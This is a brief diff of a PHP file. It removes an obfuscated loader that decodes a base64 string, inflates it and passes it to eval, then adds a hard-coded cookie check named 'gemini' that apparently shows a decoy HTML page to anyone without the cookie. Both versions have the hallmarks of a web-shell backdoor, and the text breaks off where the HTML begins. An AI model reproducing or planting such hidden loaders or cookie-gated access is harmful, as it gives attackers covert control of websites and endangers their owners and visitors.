@@ -1,8 +1,10 @@
 <?php
-$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
-$Lix = "==AntQcrAUjQmGobAXVt0ClVUAcUpiKVV/YUocoVNSn93fv93lIUR3iTuwCzQB9UMpc5ivqAUtMzN38TKBVVwWVTpw8Sv0ITO/8zO/UiNlkLNhEKtmkUlLe5mTL0RrCLJ5yLL+MzO7SLOtCn49PlAsWA";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
+session_start();
+
+$expected_cookie_value = "gemini";
+
+
+if (!isset($_COOKIE['gemini']) || $_COOKIE['gemini'] !== $expected_cookie_value) {
 ?>
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
